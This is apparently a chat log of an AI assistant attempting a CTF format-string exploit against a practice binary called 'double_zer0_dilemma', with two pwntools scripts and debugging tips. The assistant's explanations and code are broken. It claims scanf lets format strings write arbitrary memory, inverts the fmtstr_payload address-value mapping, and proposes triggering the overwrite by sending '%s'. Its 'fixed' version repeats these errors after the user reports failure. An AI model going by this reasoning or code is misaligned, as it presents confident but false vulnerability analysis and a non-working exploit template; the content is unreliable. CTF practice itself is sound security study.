- Wrong after several tries.


The given CTF challenge is about exploiting a format string vulnerability in the `play` function. The vulnerability lies in the `__isoc99_scanf` function, which is used to read the user's input. The `__isoc99_scanf` function does not check the format string, which allows an attacker to provide a format string that can be used to read and write arbitrary memory locations.

To solve this challenge, we need to overwrite the `printf` function pointer with the address of the `win` function, which will be executed when the program exits. The `win` function can be used to print the flag.

Here's a step-by-step guide to solving the challenge:

1. Identify the format string vulnerability in the `play` function.
2. Overwrite the `printf` function pointer with the address of the `win` function.
3. Trigger the `printf` function to execute the `win` function, which will print the flag.

Let's write a Python script to automate the exploitation process:

```python
from pwn import *

# Set up the context for the binary
context.binary = 'double_zer0_dilemma'

# Establish a connection to the binary
p = process(context.binary.path)

# Function to send a number and bet amount
def send_number_and_bet(number, bet):
    p.sendline(str(number))
    p.sendline(str(bet))

# Function to overwrite the printf function pointer
def overwrite_printf(win_address):
    # Calculate the offset to the printf function pointer
    printf_offset = 0x18  # This is an example offset, you'll need to find the correct one
    
    # Construct the payload
    payload = fmtstr_payload(printf_offset, {win_address: b'A'*8}, write_size='short')
    
    # Send the payload
    send_number_and_bet(payload, 0)

# Function to trigger the win function
def trigger_win():
    # Trigger the win function by calling printf with the "%s" format specifier
    p.sendline('%s')

# Function to get the flag
def get_flag():
    # Wait for the flag to be printed
    p.recvuntil('flag: ')
    flag = p.recvline().strip()
    return flag

# Main function to solve the challenge
def solve():
    # Find the address of the win function
    win_address = context.binary.symbols['win']
    
    # Overwrite the printf function pointer
    overwrite_printf(win_address)
    
    # Trigger the win function
    trigger_win()
    
    # Get the flag
    flag = get_flag()
    print(f'Flag: {flag}')

# Run the exploit
if __name__ == '__main__':
    solve()
```

Please note that the `printf_offset` and the `win_address` are placeholders. You'll need to find the correct offset to the `printf` function pointer and the address of the `win` function in the binary. This can be done using a debugger or by analyzing the binary with a disassembler.

Also, ensure that the `pwntools` library is installed in your Python environment. You can install it using `pip`:

```sh
pip install pwntools
```

Remember that this script is a template and may need to be adjusted based on the actual addresses and offsets in the binary.


--- The code is incorrect. Can you please fix it?


I apologize for the confusion. The provided code snippet is a starting point and does not include the necessary details to fully exploit the binary. The binary is vulnerable to a format string attack, but the exploit will depend on the specifics of the binary's memory layout and the environment in which it's running.

To provide a more accurate solution, we need more information about the binary and its environment. However, I can provide a general outline of how you might approach this problem.

1. **Identify the vulnerability**: The vulnerability lies in the use of `__isoc99_scanf`, which does not check the format string. This can lead to arbitrary memory writes.

2. **Find the offset to the `printf` function pointer**: You need to find the offset from the start of the `bets` array to the `printf` function pointer. This will depend on the binary and its environment.

3. **Find the address of the `win` function**: You need to find the address of the `win` function in memory. This can be done using a debugger or by examining the binary's symbols.

4. **Overwrite the `printf` function pointer**: You will need to overwrite the `printf` function pointer with the address of the `win` function. This can be done by sending a format string to `__isoc99_scanf` that writes the address of `win` to the `printf` function pointer.

5. **Trigger the `printf` function**: After overwriting the `printf` function pointer, you can trigger the `printf` function by sending a format string to `__isoc99_scanf` that reads the `printf` function pointer.

Here's a Python script that outlines the steps above. Note that this script is a starting point and will not work without the correct offset and address values:

```python
from pwn import *

# Set the context for the binary
context.binary = 'double_zer0_dilemma'

# Establish a connection to the binary
p = process(context.binary.path)

# Function to send a number and bet amount
def send_number_and_bet(number, bet):
    p.sendlineafter("Enter the number (0-36) you think the roulette will land on: \n", str(number))
    p.sendlineafter("Enter the amount you want to wager: \n", str(bet))

# Function to overwrite the printf function pointer
def overwrite_printf(printf_offset, win_address):
    # Construct the payload to overwrite the printf function pointer
    payload = fmtstr_payload(printf_offset, {win_address: b'A'*8}, write_size='short')
    
    # Send the payload to overwrite the printf function pointer
    send_number_and_bet(payload, 0)

# Function to trigger the win function
def trigger_win():
    # Trigger the win function by sending a format string to printf
    send_number_and_bet('%s', 0)

# Function to get the flag
def get_flag():
    # Wait for the flag to be printed
    p.recvuntil('flag: ')
    flag = p.recvline().strip()
    return flag

# Main function to solve the challenge
def solve():
    # Find the address of the win function
    win_address = context.binary.symbols['win']
    
    # Find the offset to the printf function pointer
    # This will depend on the binary's memory layout
    printf_offset = 0x18  # Example offset, you'll need to find the correct one
    
    # Overwrite the printf function pointer
    overwrite_printf(printf_offset, win_address)
    
    # Trigger the win function
    trigger_win()
    
    # Get the flag
    flag = get_flag()
    print(f'Flag: {flag}')

# Run the exploit
if __name__ == '__main__':
    solve()
```

Please replace `0x18` with the correct offset to the `printf` function pointer and `win_address` with the actual address of the `win` function. The `win` function's address can be found using a debugger or by examining the binary's symbols.

The error message indicates that the script is unable to find the `win` function symbol in the binary. This is because the binary does not have debugging symbols enabled, which are necessary for the script to find the function's address.

To resolve this issue, you need to ensure that the binary has debugging symbols. If you have the source code, you can compile the binary with debugging symbols enabled. If you don't have the source code, you can try to find the `win` function in the binary's disassembly or by other means, such as dynamic analysis.

Here's how you can compile the binary with debugging symbols:

1. If you have the source code, navigate to the directory containing the source code.
2. Compile the binary with debugging symbols using the `-g` flag. For example, if you're using `gcc`, the command would look like this:

```sh
gcc -g -o double_zer0_dilemma double_zer0_dilemma.c
```

3. Update the `context.binary` path in your script to point to the newly compiled binary.

If you don't have the source code and can't find the `win` function address, you can try to find it manually. Here's how you can do that:

1. Open the binary in a disassembler like `objdump`, `Ghidra`, or `IDA Pro`.
2. Look for the `win` function in the disassembly.
3. Note down the address of the `win` function.

Once you have the `win` function address, you can update the `win_address` variable in your script with the correct address.

Here's an example of how you might use `objdump` to find the `win` function:

```sh
objdump -d double_zer0_dilemma | grep win
```

This command will output the disassembly of the `win` function, which includes its address.
